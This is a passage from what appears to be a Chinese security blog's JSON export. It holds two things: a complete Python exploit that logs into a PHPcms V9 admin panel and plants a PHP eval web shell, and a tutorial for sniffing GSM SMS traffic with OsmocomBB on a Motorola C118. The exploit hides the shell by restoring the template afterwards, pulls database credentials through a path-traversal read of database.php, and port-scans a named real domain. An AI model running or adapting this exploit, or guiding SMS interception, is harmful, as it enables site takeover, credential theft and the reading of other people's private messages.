class=\"line\"></div><div class=\"line\">@author: Return</div><div class=\"line\">'''</div><div class=\"line\">import cookielib</div><div class=\"line\">import urllib2,urllib</div><div class=\"line\">import re</div><div class=\"line\">import sys</div><div class=\"line\">import os</div><div class=\"line\">import socket</div><div class=\"line\">class getShell:</div><div class=\"line\"></div><div class=\"line\">    rhost = ''                                  #远程目标主机</div><div class=\"line\">    cookieSavePath  = 'tmp/cookie/cookie.dat'   #cookie 保存位置</div><div class=\"line\">    codeSavePath    = 'tmp/code/code.png'       #code    保存位置</div><div class=\"line\">    phpShell        = '&lt;?php $shell = &quot;&lt;?php eval($_POST[cmd]);?&gt;&quot;; file_put_contents(&quot;caches/cmd.php&quot;,$shell); ?&gt;' #一句话</div><div class=\"line\">    header          = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11 QIHU 360EE'}</div><div class=\"line\">    tmpPath         = ''    #临时地址存贮变量</div><div class=\"line\">    dataBaseInfo    = {}    #数据库信息</div><div class=\"line\">    postData        = {}    #post数据</div><div class=\"line\">    url             = ''    #远程url地址</div><div class=\"line\">    username        = ''    #用户名</div><div class=\"line\">    password        = ''    #用户密码</div><div class=\"line\">    vfCode          = ''    #验证码</div><div class=\"line\">    pc_hash         = ''    #phpcmsV9校验值</div><div class=\"line\">    result          = ''    #临时变量</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    # __init__    初始化函数</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    def __init__(self):</div><div class=\"line\">        self.cookie = cookielib.LWPCookieJar()</div><div class=\"line\">        urllib2.install_opener(urllib2.build_opener(urllib2.HTTPCookieProcessor(self.cookie)))</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    # login    登录</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    def login(self):</div><div class=\"line\">        self.getVerifyCode()    #先获取验证码</div><div class=\"line\">        self.tmpPath  = '/index.php?m=admin&amp;c=index&amp;a=login&amp;dosubmit=1'</div><div class=\"line\">        self.postData = {</div><div class=\"line\">             'username':self.username,</div><div class=\"line\">             'password':self.password,</div><div class=\"line\">             'code':self.vfCode,</div><div class=\"line\">             'dosubmit':''</div><div class=\"line\">            }</div><div class=\"line\">        self.url = 'http://'+self.rhost+self.tmpPath</div><div class=\"line\">        self.result = self.urlPostData()</div><div class=\"line\"></div><div class=\"line\">        if len(re.findall(&quot;登录成功&quot;,self.result)):</div><div class=\"line\">            self.pc_hash = re.search(&quot;(?&lt;=pc_hash=)(.+?)(?=')&quot;,self.result).group()</div><div class=\"line\">            print '登录成功'</div><div class=\"line\">            self.wirteShell() # 登陆成功后写入shell</div><div class=\"line\">        else:</div><div class=\"line\">            print '登录失败'</div><div class=\"line\">            print re.search('(330px&quot;&gt;)((.|n)*?)(?=&lt;/div&gt;)',self.result).group(2)</div><div class=\"line\">            self.login()</div><div class=\"line\">    def wirteShell(self):</div><div class=\"line\">        print '写入Shell...'</div><div class=\"line\">        tmpPath = '/index.php?m=template&amp;c=file&amp;a=edit_file&amp;style=default&amp;dir=search&amp;file=footer.html&amp;pc_hash='</div><div class=\"line\">        self.url = 'http://'+self.rhost+tmpPath+self.pc_hash   #v9中必须加上校验码，否则不能通过</div><div class=\"line\">        self.result = self.urlPostData()</div><div class=\"line\">        if len(re.findall('点击插入',self.result)):</div><div class=\"line\">            templateTmp = re.search(&quot;(&lt;te.*?&gt;)((.|n)*?)(&lt;.*?&gt;)&quot;,self.result).group(2)</div><div class=\"line\">            #提交写shell模版</div><div class=\"line\">            self.postData = {</div><div class=\"line\">                    'code':self.phpShell,</div><div class=\"line\">                    'dosubmit':'提交',</div><div class=\"line\">                    'pc_hash':self.pc_hash</div><div class=\"line\">                }</div><div class=\"line\">            self.url = 'http://'+self.rhost+tmpPath+self.pc_hash</div><div class=\"line\">            self.urlPostData()</div><div class=\"line\">            urllib2.urlopen('http://'+self.rhost+'/index.php?m=search').read()#访问模版页面生成shell</div><div class=\"line\">            #写回原模版</div><div class=\"line\">            self.postData = {</div><div class=\"line\">                    'code':templateTmp,</div><div class=\"line\">                    'dosubmit':'提交',</div><div class=\"line\">                    'pc_hash':self.pc_hash</div><div class=\"line\">                }</div><div class=\"line\">            self.url = 'http://'+self.rhost+tmpPath+self.pc_hash</div><div class=\"line\">            self.urlPostData()</div><div class=\"line\">        else:</div><div class=\"line\">            print '没有找到Search的foot模版...'</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    # getVerifyCode    获取验证码</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    def getVerifyCode(self):</div><div class=\"line\">        #验证码获取地址</div><div class=\"line\">        self.tmpPath = '/api.php?op=checkcode&amp;code_len=4&amp;font_size=20&amp;width=130&amp;height=50&amp;font_color=&amp;background='</div><div class=\"line\">        self.url = 'http://'+self.rhost+self.tmpPath</div><div class=\"line\">        open(self.codeSavePath,'wb').write(self.urlPostData())</div><div class=\"line\">        print '请输入验证码:'</div><div class=\"line\">        self.showPic()</div><div class=\"line\">        self.vfCode = sys.stdin.readline()</div><div class=\"line\"></div><div class=\"line\">    #==============================================================</div><div class=\"line\">    # urlPostData    url Post提交数据</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    def urlPostData(self):</div><div class=\"line\">        postData = urllib.urlencode(self.postData)</div><div class=\"line\">        req = urllib2.Request(</div><div class=\"line\">                          url = self.url,</div><div class=\"line\">                          data = postData,</div><div class=\"line\">                          headers = self.header</div><div class=\"line\">                          )</div><div class=\"line\">        result = urllib2.urlopen(req).read()</div><div class=\"line\">        self.saveCookie()</div><div class=\"line\">        self.delVariable()</div><div class=\"line\">        return result</div><div class=\"line\"></div><div class=\"line\">    #==============================================================</div><div class=\"line\">    # getDataBaseInfo    获取数据库信息</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    def getDataBaseInfo(self):</div><div class=\"line\">        #爆数据库信息地址</div><div class=\"line\">        self.tmpPath = '/index.php?m=search&amp;c=index&amp;a=public_get_suggest_keyword&amp;url=asdf&amp;q=../../caches/configs/database.php'</div><div class=\"line\">        self.url = 'http://'+self.rhost+self.tmpPath</div><div class=\"line\">        result = self.urlPostData()</div><div class=\"line\">        self.dataBaseInfo['hostName'] = re.search(&quot;(?&lt;='hostname' =&gt; ')(.*?)(?=',)&quot;,result).group()</div><div class=\"line\">        self.dataBaseInfo['database'] = re.search(&quot;(?&lt;='database' =&gt; ')(.*?)(?=',)&quot;,result).group()</div><div class=\"line\">        self.dataBaseInfo['username'] = re.search(&quot;(?&lt;='username' =&gt; ')(.*?)(?=',)&quot;,result).group()</div><div class=\"line\">        self.dataBaseInfo['password'] = re.search(&quot;(?&lt;='password' =&gt; ')(.*?)(?=',)&quot;,result).group()</div><div class=\"line\">        self.dataBaseInfo['tablepre'] = re.search(&quot;(?&lt;='tablepre' =&gt; ')(.*?)(?=',)&quot;,result).group()</div><div class=\"line\">        self.dataBaseInfo['type'] = re.search(&quot;(?&lt;='type' =&gt; ')(.*?)(?=',)&quot;,result).group()</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    # printDbInfo    输出数据库信息</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    def printDbInfo(self):</div><div class=\"line\">        print 'HostName:',self.dataBaseInfo['hostName']</div><div class=\"line\">        print 'DataBase:',self.dataBaseInfo['database']</div><div class=\"line\">        print 'UserName:',self.dataBaseInfo['username']</div><div class=\"line\">        print 'Password:',self.dataBaseInfo['password']</div><div class=\"line\">        print 'TablePre:',self.dataBaseInfo['tablepre']</div><div class=\"line\">        print 'DataType:',self.dataBaseInfo['type']</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    # scanPort    端口扫描</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    def scanPort(self):</div><div class=\"line\">        for p in range(80,8000):</div><div class=\"line\">            try:</div><div class=\"line\">                ip = 'www.gidigame.com'</div><div class=\"line\">                port = p</div><div class=\"line\">                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</div><div class=\"line\">                s.connect((ip,port))</div><div class=\"line\">                print 'Port:',port,' open'</div><div class=\"line\">                s.close()</div><div class=\"line\">            except socket.error,msg:</div><div class=\"line\">                pass</div><div class=\"line\">                #print 'Port:',port,' close'</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    # setRhost    设置目标主机</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    def setRhost(self,host):</div><div class=\"line\">        self.rhost = host</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    # getRhost    获取目标主机</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    def getRhost(self):</div><div class=\"line\">        return self.rhost</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    # setShell    自定义shell</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    def setShell(self,shellCode):</div><div class=\"line\">        self.phpShell = shellCode</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    # saveCookie    保存cookie值</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    def saveCookie(self):</div><div class=\"line\">        self.cookie.save(self.cookieSavePath)</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    # logMsg    日志信息，这里可以自己捕捉异常后处理信息</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    def logMsg(self,msg):</div><div class=\"line\">        print msg</div><div class=\"line\">        exit()</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    # showPic    用来显示验证码</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    def showPic(self):</div><div class=\"line\">        imgPath = os.path.abspath(self.codeSavePath)</div><div class=\"line\">        os.system('rundll32.exe %SystemRoot%system32shimgvw.dll,ImageView_Fullscreen '+imgPath)</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    # delVariable    清除变量，防止产生误差</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    def delVariable(self):</div><div class=\"line\">        self.url            = ''</div><div class=\"line\">        self.tmpPath        = ''</div><div class=\"line\">        self.dataBaseInfo   = {}</div><div class=\"line\">        self.postData       = {}</div><div class=\"line\">        self.header         ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11 QIHU 360EE'}</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    # __del__    析构函数，类被注销时候调用</div><div class=\"line\">    #==============================================================</div><div class=\"line\">    def __del__(self):</div><div class=\"line\">        print 'Bye...'</div><div class=\"line\">def sysinfo():</div><div class=\"line\">    print '''</div><div class=\"line\">********************************************************************************</div><div class=\"line\">PHPcmsV9 自动写shell</div><div class=\"line\"></div><div class=\"line\">功能：自动写入caches目录下cmd.php一句话 密码:cmd</div><div class=\"line\"></div><div class=\"line\">Author: Return    Blog:www.creturn.com</div><div class=\"line\"></div><div class=\"line\">Example: exp.py www.creutn.com username password</div><div class=\"line\">********************************************************************************</div><div class=\"line\">'''</div><div class=\"line\">#================================================================</div><div class=\"line\"># main    入口函数</div><div class=\"line\">#================================================================</div><div class=\"line\">def main():</div><div class=\"line\">    sysinfo();</div><div class=\"line\">    shell = getShell()</div><div class=\"line\">    if(len(sys.argv) &gt; 3):</div><div class=\"line\">        shell.setRhost(sys.argv[1])</div><div class=\"line\">        shell.username = sys.argv[2]</div><div class=\"line\">        shell.password = sys.argv[3]</div><div class=\"line\">\tshell.login()</div><div class=\"line\">    else:</div><div class=\"line\">        print '参数不对！'</div><div class=\"line\"></div><div class=\"line\">if __name__ == '__main__':</div><div class=\"line\">    main()</div></pre></td></tr></table></figure>\n\n","_id":"q3d5s2uxdoyeqik3","comments":true,"layout":"post","photos":[],"link":""},{"title":"Radiowar 之OsmocomBB SMS Sniffer","id":320,"date":1383741289000,"tags":[],"categories":["ng1ki7p1v08zbwrz","3ew512opa4s8w18i"],"content":"<p>好久没写东西了，前几天看到Radiowar这个词的时候感觉有点意思，</p>\n<p>可能是因为之前写过War Driving 的文章对War很敏感吧.</p>\n<p>Radiowar指的是无线安全攻击，不过很多人听到无线攻击就和无线网络破解划等号了。</p>\n<p>其实Radiowar 包含所有无线电子设备如：2.4GHz网络、RFID、NFC等等.</p>\n<p>很多人现在都在玩Proxmark3 奈何成本过大，做个试验最少也得千把来块，自己对这个也仅仅是感兴趣，</p>\n<p>所以就从一些简单且Cheap的设备玩起，刚好最近看到有几个人发了GSM网络嗅探的文章，</p>\n<p>自己就弄些设备来玩，成本较低，一套设备下来100左右。</p>\n<p>设备清单：</p>\n<ol>\n<li>摩托罗拉 C118 (25块)</li>\n<li>FT232RL USB TO TTL (30元)</li>\n<li>摩托罗拉 Motorola C118专用数据连接线 (10块)</li>\n<li>MiniUSB 链接线(10元，这个大家手里应该都有)</li>\n</ol>\n<p>如下图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-7.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-7.png\" alt=\"QQ20131106-7\"></a><br><a id=\"more\"></a></p>\n<p>淘宝购买地址就放在文章结尾吧.</p>\n<p>外围设备是上面那些，现在还需要一台PC以及装有Linux操作系统的虚拟机，当然PC上面直接装的linux更好</p>\n<p>还有一个主角：OsmocomBB</p>\n<p>这里稍微介绍下OsmocomBB，OsmocomBB是GSM协议栈(Protocols stack)的开源实现，全称是Open source mobile communication Baseband.</p>\n<p>目的是要实现手机端从物理层(layer1)到layer3的三层实现。</p>\n<p>但是目前来看，真正的物理层(physical layer)并没有真正的开源实现，暂时也没看到实施计划。只有物理层控制。</p>\n<p>因为真正的物理层是运行在baseband processor的DSP core上,涉及到许多信号处理算法的实现，而且还要牵扯很多硬件RF的东西。</p>\n<p>额好吧，上面这段OsmocomBB介绍文字来自百度~~</p>\n<p>我自己的实验环境为：</p>\n<p>os x 10.9  + VirtualBox + Ubuntu 12.04 (32位)</p>\n<p>操作系统各个平台都无所谓，我想大多数都用虚拟机来测的，所以建议使用Ubuntu 12.04 至少按照我这里介绍的做下来应该不会出错。</p>\n<p>虚拟机里面如何安装Ubuntu 12.04我这里几不操作了，网上教程一大堆。</p>\n<p>首先我们安装交叉编译环境：</p>\n<p>1. 用户目录下建立source/arm</p>\n<p>2. 进入arm目录再创建三个目录  build、 install 、src</p>\n<p>3. 进入src目录分别下载这三个文件包：</p>\n<p><a href=\"http://ftp.gnu.org/gnu/gcc/gcc-4.5.2/gcc-4.5.2.tar.bz2\" target=\"_blank\" rel=\"external\">http://ftp.gnu.org/gnu/gcc/gcc-4.5.2/gcc-4.5.2.tar.bz2</a></p>\n<p><a href=\"http://ftp.gnu.org/gnu/binutils/binutils-2.21.1a.tar.bz2\" target=\"_blank\" rel=\"external\">http://ftp.gnu.org/gnu/binutils/binutils-2.21.1a.tar.bz2</a></p>\n<p>ftp://sources.redhat.com/pub/newlib/newlib-1.19.0.tar.gz</p>\n<p>4. 下载 gnu-arm-build.2.sh 文件到arm目录 <a href=\"http://bb.osmocom.org/trac/raw-attachment/wiki/GnuArmToolchain/gnu-arm-build.2.sh\" target=\"_blank\" rel=\"external\">http://bb.osmocom.org/trac/raw-attachment/wiki/GnuArmToolchain/gnu-arm-build.2.sh</a></p>\n<p>目录结构如图所示：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/屏幕快照-2013-11-06-06.05.58-PM.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/屏幕快照-2013-11-06-06.05.58-PM.png\" alt=\"屏幕快照 2013-11-06 06.05.58 PM\"></a></p>\n<p>编译前需要安装相应的库文件执行如下命令：</p>\n<p>[shell]<br>sudo apt-get install build-essential libgmp3-dev libmpfr-dev libx11-6 libx11-dev texinfo flex bison libncurses5 libncurses5-dbg libncurses5-dev libncursesw5 libncursesw5-dbg libncursesw5-dev zlibc zlib1g-dev libmpfr4 libmpc-dev<br>[/shell]</p>\n<p>安装完</p>\n<p>在arm根目录执行如下命令:</p>\n<p>[shell]<br>chmod +x  gnu-arm-build.2.sh<br>./ gnu-arm-build.2.sh<br>[/shell]</p>\n<p>解释下这两条命令的意思，chmod +x 是给与  gnu-arm-build.2.sh 可执行权限 ， ./ gnu-arm-build.2.sh 是执行它</p>\n<p>执行 gnu-arm-build.2.sh后会提示你是否继续，ctrl+c 则取消，直接回车。如下图所示：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/屏幕快照-2013-11-06-06.16.42-PM.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/屏幕快照-2013-11-06-06.16.42-PM.png\" alt=\"屏幕快照 2013-11-06 06.16.42 PM\"></a></p>\n<p>完成后会看到arm/install目录结构如图所示：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/屏幕快照-2013-11-06-06.31.12-PM.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/屏幕快照-2013-11-06-06.31.12-PM.png\" alt=\"屏幕快照 2013-11-06 06.31.12 PM\"></a></p>\n<p>我们需要将 arm/install/bin目录加入环境变量中，注意这里最好直接填写绝对路径</p>\n<p>获取绝对路径命令，在arm/install/bin目录下执行pwd命令。如下图</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/屏幕快照-2013-11-06-06.32.52-PM.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/屏幕快照-2013-11-06-06.32.52-PM.png\" alt=\"屏幕快照 2013-11-06 06.32.52 PM\"></a></p>\n<p>加入环境变量的方法用vi打开 ~/.bashrc 在最后一样加入  export PATH=$PATH:/home/creturn/source/arm/install/bin</p>\n<p>注意$PATH:冒号后面接的是你自己的绝对路径，有的同学不会用vi的话我就把具体命令写出来</p>\n<p>[shell]<br>cd 回车  #切换到主目录<br>vi ./.bashrc  #打开文件<br>shift+g  #按shift和g 跳转到最后一样<br>o       #输入小写字母o换行并进入插入模式，然后把上面需要加入的代码加入进去<br>esc    # 按esc键进入命令模式<br>:wq  #按冒号然后输入回车编辑完成<br>[/shell]</p>\n<p>为照顾linux新手对写点东西，汗~~</p>\n<p>重新打开终端或者直接执行source ~/.bashrc 让环境变量生效</p>\n<p>在终端中输入arm然后按tab键，如果出现 arm-开头的如下图所示就说明编译环境搞定了：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/屏幕快照-2013-11-06-06.43.44-PM.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/屏幕快照-2013-11-06-06.43.44-PM.png\" alt=\"屏幕快照 2013-11-06 06.43.44 PM\"></a></p>\n<p>好了累了半死才把编译环境搞定，接下来下载 OsmocomBB 源码</p>\n<p>在source目录下执行下面两条命令：</p>\n<p>[shell]<br>git clone git://git.osmocom.org/osmocom-bb.git<br>git clone git://git.osmocom.org/libosmocore.git<br>[/shell]</p>\n<p>先编译osmocom核心库文件,进入libosmocore 执行如下命令：</p>\n<p>[shell]<br>autoreconf -i<br>./configure<br>make<br>sudo make install<br>[/shell]</p>\n<p>然后进入osmocom/src下目录</p>\n<p>git checkout —track origin/luca/gsmmap 切换到这个分支</p>\n<p>执行make命令</p>\n<p>如果不出意外你所需软件环境和固件都编译好了。Ubuntu12.04 默认能够识别FT232R所以不用装驱动。</p>\n<p>接下来链接硬件， FT232RL USB TO TTL 和 摩托的数据线链接注意上面对应的标识接入GND、RX、TX 所以不用担心接错，我也第一次摸板子。</p>\n<p>链接完成后需要注意，如果链接正常下载板上面的蓝色的灯和红色的灯都要亮，不然肯定是接触不良，</p>\n<p>我之前由于接触不良导致固件写入一半就会停止，或者包其他错误。所以这里需要特别注意。</p>\n<p>插入硬件后在虚拟机菜单中把接入下载板子的usb接口分配给虚拟机如图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-9.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-9.png\" alt=\"QQ20131106-9\"></a></p>\n<p>在终端中输入lsusb 如果驱动正常就能看到usb-serial</p>\n<p>看下分配前和分配后的区别如下图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-10.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-10.png\" alt=\"QQ20131106-10\"></a></p>\n<p>接下来我们写入固件到手机中，这里需要说明的一点，很多人说是刷入固件，导致很多人误认为是刷机，其实只是把</p>\n<p>固件加载到手机raw中执行而已，所以也不要担心输入固件后手机就不能用了。</p>\n<p>切换到 osmocom-bb/src/host/osmocon/目录 执行如下命令：</p>\n<p>[shell]<br>/osmocon -m c123 -p /dev/ttyUSB0  ../../target/firmware/board/compal_e88/layer1.compalram.bin<br>[/shell]</p>\n<p>这里同样需要说明下有的 -m 后面接的是 c123xor 区别是是否检测数据总和</p>\n<p>注意上面命令需要在关机下执行，然后短按开机键，注意不要长按不然就开机了</p>\n<p>如果不出意外就能看到如下图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-11.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-11.png\" alt=\"QQ20131106-11\"></a></p>\n<p>这里需要提醒下，由于买的手机都是二手的，所以接口处有可能会有松动，所以如果看到数据写入被取消就多试几次</p>\n<p>调整下接口看看是否有松动，我机会每次都要试4-5次才能正常写入固件，看到staring up 基本就成功了，同事可以看到</p>\n<p>手机上面也显示了 Layer 1 osmocom-bb 字样</p>\n<p>[<img src=\"http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-12.png\" alt=\"QQ20131106-12\"></p>\n<p>](<a href=\"http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-12.png)接下来在\" target=\"_blank\" rel=\"external\">http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-12.png)接下来在</a> /osmocom-bb/src/host/layer23/src/misc/ 目录执行  ./cell_log</p>\n<p>输出日志信息，在里面可以看到基站信息</p>\n<p>找到类似信息</p>\n<p>cell_log.c:248 Cell: ARFCN=117 PWR=-62dB MCC=460 MNC=01</p>\n<p>如下图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-13.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-13.png\" alt=\"QQ20131106-13\"></a></p>\n<p>记住ARFCN后面的编号</p>\n<p>然后在同样目录下输入下面命令把数据流导入本地4729端口</p>\n<p>[shell]</p>\n<p>./ccch_scan -i 127.0.0.1 -a 117 # 注意这里的117就是上面的ARFCN后面的编号</p>\n<p>[/shell]</p>\n<p>如下图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-14.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-14.png\" alt=\"QQ20131106-14\"></a></p>\n<p>接下来用wireshark 抓包，输入如下命令：</p>\n<p>[shell]</p>\n<p>sudo wireshark -k -i lo -f ‘port 4729’</p>\n<p>[/shell]</p>\n<p>然后在wireshark里面过滤gsm_sms协议数据，里面就包含了短信数据</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-15.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-15.png\" alt=\"QQ20131106-15\"></a></p>\n<p>&nbsp;</p>\n<p>好了就到这里了，剩下的自己慢慢玩吧，做了一个视频演示：</p>\n<p>&nbsp;</p>\n<embed src=\"http://player.youku.com/player.php/sid/XNjMwNjY5OTA0/v.swf\" allowfullscreen=\"true\" quality=\"high\" width=\"480\" height=\"400\" align=\"middle\" allowscriptaccess=\"always\" type=\"application/x-shockwave-flash\">\n\n<p>高清版下载地址：<a href=\"http://pan.baidu.com/s/1ACSOE\" target=\"_blank\" rel=\"external\">http://pan.baidu.com/s/1ACSOE</a></p>\n<p>淘宝地址在这里就去掉了，给别人带来了“一些”麻烦， 需要买的直接在淘宝里面搜索相应的关键字就能找到。 修改日期：2013.12.1</p>\n<p>手机就随便在淘宝上找一家就行</p>\n","source":"_posts/radiowar-之osmocombb-sms-sniffer.md","raw":"title: \"Radiowar 之OsmocomBB SMS Sniffer\"\nid: 320\ndate: 2013-11-06 20:34:49\ntags: \ncategories: \n- 原创作品\n- 技术文章\n---\n\n好久没写东西了，前几天看到Radiowar这个词的时候感觉有点意思，\n\n可能是因为之前写过War Driving 的文章对War很敏感吧.\n\nRadiowar指的是无线安全攻击，不过很多人听到无线攻击就和无线网络破解划等号了。\n\n其实Radiowar 包含所有无线电子设备如：2.4GHz网络、RFID、NFC等等.\n\n很多人现在都在玩Proxmark3 奈何成本过大，做个试验最少也得千把来块，自己对这个也仅仅是感兴趣，\n\n所以就从一些简单且Cheap的设备玩起，刚好最近看到有几个人发了GSM网络嗅探的文章，\n\n自己就弄些设备来玩，成本较低，一套设备下来100左右。\n\n\n\n设备清单：\n\n1. 摩托罗拉 C118 (25块)\n2. FT232RL USB TO TTL (30元)\n3. 摩托罗拉 Motorola C118专用数据连接线 (10块)\n4. MiniUSB 链接线(10元，这个大家手里应该都有)\n\n\n如下图：\n\n[![QQ20131106-7](http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-7.png)](http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-7.png)\n<!--more-->\n\n淘宝购买地址就放在文章结尾吧.\n\n外围设备是上面那些，现在还需要一台PC以及装有Linux操作系统的虚拟机，当然PC上面直接装的linux更好\n\n还有一个主角：OsmocomBB\n\n这里稍微介绍下OsmocomBB，OsmocomBB是GSM协议栈(Protocols stack)的开源实现，全称是Open source mobile communication Baseband.\n\n目的是要实现手机端从物理层(layer1)到layer3的三层实现。\n\n但是目前来看，真正的物理层(physical layer)并没有真正的开源实现，暂时也没看到实施计划。只有物理层控制。\n\n因为真正的物理层是运行在baseband processor的DSP core上,涉及到许多信号处理算法的实现，而且还要牵扯很多硬件RF的东西。\n\n额好吧，上面这段OsmocomBB介绍文字来自百度~~\n\n我自己的实验环境为：\n\nos x 10.9  + VirtualBox + Ubuntu 12.04 (32位)\n\n操作系统各个平台都无所谓，我想大多数都用虚拟机来测的，所以建议使用Ubuntu 12.04 至少按照我这里介绍的做下来应该不会出错。\n\n虚拟机里面如何安装Ubuntu 12.04我这里几不操作了，网上教程一大堆。\n\n首先我们安装交叉编译环境：\n\n1\\. 用户目录下建立source/arm\n\n2\\. 进入arm目录再创建三个目录  build、 install 、src\n\n3\\. 进入src目录分别下载这三个文件包：\n\nhttp://ftp.gnu.org/gnu/gcc/gcc-4.5.2/gcc-4.5.2.tar.bz2\n\nhttp://ftp.gnu.org/gnu/binutils/binutils-2.21.1a.tar.bz2\n\nftp://sources.redhat.com/pub/newlib/newlib-1.19.0.tar.gz\n\n4\\. 下载 gnu-arm-build.2.sh 文件到arm目录 http://bb.osmocom.org/trac/raw-attachment/wiki/GnuArmToolchain/gnu-arm-build.2.sh\n\n目录结构如图所示：\n\n[![屏幕快照 2013-11-06 06.05.58 PM](http://asset.creturn.com/asset/uploads/2013/11/屏幕快照-2013-11-06-06.05.58-PM.png)](http://asset.creturn.com/asset/uploads/2013/11/屏幕快照-2013-11-06-06.05.58-PM.png)\n\n编译前需要安装相应的库文件执行如下命令：\n\n[shell]\nsudo apt-get install build-essential libgmp3-dev libmpfr-dev libx11-6 libx11-dev texinfo flex bison libncurses5 libncurses5-dbg libncurses5-dev libncursesw5 libncursesw5-dbg libncursesw5-dev zlibc zlib1g-dev libmpfr4 libmpc-dev\n[/shell]\n\n安装完\n\n在arm根目录执行如下命令:\n\n[shell]\nchmod +x  gnu-arm-build.2.sh\n./ gnu-arm-build.2.sh\n[/shell]\n\n解释下这两条命令的意思，chmod +x 是给与  gnu-arm-build.2.sh 可执行权限 ， ./ gnu-arm-build.2.sh 是执行它\n\n执行 gnu-arm-build.2.sh后会提示你是否继续，ctrl+c 则取消，直接回车。如下图所示：\n\n[![屏幕快照 2013-11-06 06.16.42 PM](http://asset.creturn.com/asset/uploads/2013/11/屏幕快照-2013-11-06-06.16.42-PM.png)](http://asset.creturn.com/asset/uploads/2013/11/屏幕快照-2013-11-06-06.16.42-PM.png)\n\n完成后会看到arm/install目录结构如图所示：\n\n[![屏幕快照 2013-11-06 06.31.12 PM](http://asset.creturn.com/asset/uploads/2013/11/屏幕快照-2013-11-06-06.31.12-PM.png)](http://asset.creturn.com/asset/uploads/2013/11/屏幕快照-2013-11-06-06.31.12-PM.png)\n\n我们需要将 arm/install/bin目录加入环境变量中，注意这里最好直接填写绝对路径\n\n获取绝对路径命令，在arm/install/bin目录下执行pwd命令。如下图\n\n[![屏幕快照 2013-11-06 06.32.52 PM](http://asset.creturn.com/asset/uploads/2013/11/屏幕快照-2013-11-06-06.32.52-PM.png)](http://asset.creturn.com/asset/uploads/2013/11/屏幕快照-2013-11-06-06.32.52-PM.png)\n\n加入环境变量的方法用vi打开 ~/.bashrc 在最后一样加入  export PATH=$PATH:/home/creturn/source/arm/install/bin\n\n注意$PATH:冒号后面接的是你自己的绝对路径，有的同学不会用vi的话我就把具体命令写出来\n\n[shell]\ncd 回车  #切换到主目录\nvi ./.bashrc  #打开文件\nshift+g  #按shift和g 跳转到最后一样\no       #输入小写字母o换行并进入插入模式，然后把上面需要加入的代码加入进去\nesc    # 按esc键进入命令模式\n:wq  #按冒号然后输入回车编辑完成\n[/shell]\n\n为照顾linux新手对写点东西，汗~~\n\n重新打开终端或者直接执行source ~/.bashrc 让环境变量生效\n\n在终端中输入arm然后按tab键，如果出现 